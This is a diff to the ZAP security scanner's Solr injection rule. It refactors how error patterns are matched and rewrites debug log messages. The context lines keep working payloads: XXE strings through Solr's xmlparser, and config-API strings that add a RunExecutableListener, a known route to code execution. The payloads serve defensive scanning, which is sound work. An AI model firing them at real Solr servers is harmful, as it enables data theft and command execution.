@@ -3,6 +3,7 @@ package org.zaproxy.zap.extension.ascanrulesAlpha;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import org.apache.log4j.Logger;
 import org.parosproxy.paros.Constant;
@@ -13,7 +14,7 @@ import org.parosproxy.paros.network.HttpMessage;
 import org.zaproxy.zap.model.Tech;
 
 /**
- * The SolrInjection plugin identifies Solr injection vulnerabilities with Solr web application.
+ * The SolrInjection plugin identifies Solr injection vulnerabilities
  *
  * @author LuigiCasciaro
  */
@@ -28,8 +29,8 @@ public class SolrInjection extends AbstractAppParamPlugin {
 	private static final String INJECTED_LISTENER = "injectedlistener";
 	private static final String UNKOWN_HOST_TOKEN = "http://_z<>a<>p<>.com	";
 	private static final String CASUAL_TOKEN = "{987987987zapPenentrationTest123123123 *";
-	private final List<Pattern> errorPatterns = initPattern(SOLR_ERROR_MATCHING);
-
+	
+	// Packets of attack rules 
 	private static final String[] ALL_DATA_INJECTION = {"{! rows=10} *", "*", "[* TO *]", "(1 OR *)"};
 	private static final String[] XXE_INJECTION = { 
 		"{!xmlparser v=\'<!DOCTYPE a SYSTEM \""+UNKOWN_HOST_TOKEN+"\"><a></a>\'}",
@@ -39,25 +40,22 @@ public class SolrInjection extends AbstractAppParamPlugin {
 		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+DEFAULT_COLLECTION+"/update?stream.body="
 		+ "[{\"id\":\"AAA\"}]&commit=true&overwrite=true\"><a></a>'}"		
 	};
-
-	//TODO: implement the penetration test for these rules.
+	//TODO: implement the penetration test for these rules
 	private static final String[] CODE_EXECUTION_INJECTION = {
 		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+INJECTED_COLLECTION+"/select?q=xxx&qt=/solr/"
 		+INJECTED_COLLECTION+"/config?stream.body={\"add-listener\":{\"event\":\"postCommit\",\"name\":\""
 		+INJECTED_LISTENER+"\",\"class\":\"solr.RunExecutableListener\"}}&shards=localhost:8983/\"><a></a>'}",
-		
 		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+DEFAULT_COLLECTION+"/select?q=xxx&qt=/solr/"
 		+DEFAULT_COLLECTION+"/config?stream.body={\"add-listener\":{\"event\":\"postCommit\",\"name\":\""
 		+INJECTED_LISTENER+"\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"\"}}&shards=localhost:8983/\"><a>"
 		+ "</a>'}"
 	};
 
-	private static final String[] SOLR_ERROR_MATCHING = {
-		"document type declaration must be well-formed",
-		"Error parsing XML stream:java.net.UnknownHostException", 
-		"Error parsing XML stream:java.net.ConnectException: Connection refused"
-	};
-
+	private  final Pattern[] errorPatterns = {
+			Pattern.compile("document type declaration must be well-formed", Pattern.CASE_INSENSITIVE),
+			Pattern.compile("Error parsing XML stream:java.net.UnknownHostException", Pattern.CASE_INSENSITIVE),
+			Pattern.compile("ConnectException: Connection refused", Pattern.CASE_INSENSITIVE) };
+	
 	private static final Logger LOG = Logger.getLogger(SolrInjection.class);
 
 	@Override
@@ -74,7 +72,7 @@ public class SolrInjection extends AbstractAppParamPlugin {
 	public int getWascId() {
 		return 19;
 	}
-	
+
 	@Override
 	public String getName() {
 		return Constant.messages.getString(MESSAGE_PREFIX + "name");
@@ -99,7 +97,7 @@ public class SolrInjection extends AbstractAppParamPlugin {
 	public String getReference() {
 		return Constant.messages.getString(MESSAGE_PREFIX + "refs");
 	}
-	
+
 	@Override
 	public String[] getDependency() {
 		return new String[] {};
@@ -127,7 +125,7 @@ public class SolrInjection extends AbstractAppParamPlugin {
 					return;
 				}
 				if (LOG.isDebugEnabled()) {
-					LOG.debug("\nTrying with the value: "+injectedValue+" to test the Solr"+ALL_DATA_ATTACK+" attack");
+					LOG.debug("\nTrying with the value: "+injectedValue+" for the \""+ALL_DATA_ATTACK+"\" attack");
 				}
 				msg = getNewMsg();
 				setParameter(msg, param, injectedValue);
@@ -144,20 +142,18 @@ public class SolrInjection extends AbstractAppParamPlugin {
 					}
 				}
 			}
-			//
 			for(String injectedValue : XXE_INJECTION) {
 				if(isStop()) {
 					if (LOG.isDebugEnabled()) { LOG.debug("Stopping the scan due to a user request"); }
 					return;
 				}
 				if (LOG.isDebugEnabled()) {
-					LOG.debug("\nTrying with the value: "+injectedValue+" to test the Solr "+XXE_ATTACK+" attack");
+					LOG.debug("\nTrying with the value: "+injectedValue+" for the \""+XXE_ATTACK+"\" attack");
 				}
 				msg = getNewMsg();
 				setParameter(msg, param, injectedValue);
 				sendAndReceive(msg);		
 				if(!getBaseMsg().getResponseBody().toString().equals(msg.getResponseBody().toString())) {
-					StringBuilder sb = new StringBuilder();
 					/*for(String m:SOLR_ERROR_MATCHING) {
 						if(bodyMsgInjected.contains(m)) {
 							bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, param, 
@@ -165,8 +161,9 @@ public class SolrInjection extends AbstractAppParamPlugin {
 							break;
 						}
 					}*/
-					for(Pattern p : errorPatterns) {
-						if(matchBodyPattern(msg, p, sb)) {
+					for(Pattern pattern : errorPatterns) {
+						Matcher matcher =  pattern.matcher(msg.getResponseBody().toString());
+						if(matcher.find()) {
 							bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, param, 
 									injectedValue, getExtraInfo(XXE_ATTACK), getSolution(), msg);
 							break;
@@ -180,13 +177,5 @@ public class SolrInjection extends AbstractAppParamPlugin {
 						" when try to send an http message");
 			}
 		}
-	}
-	
-	private static List<Pattern> initPattern(String[] eb) {
-		List<Pattern> list =  new ArrayList<>();
-		for(String regex: eb) {
-			list.add(Pattern.compile(regex, AbstractAppParamPlugin.PATTERN_PARAM));
-		}
-		return list;
 	}
 }
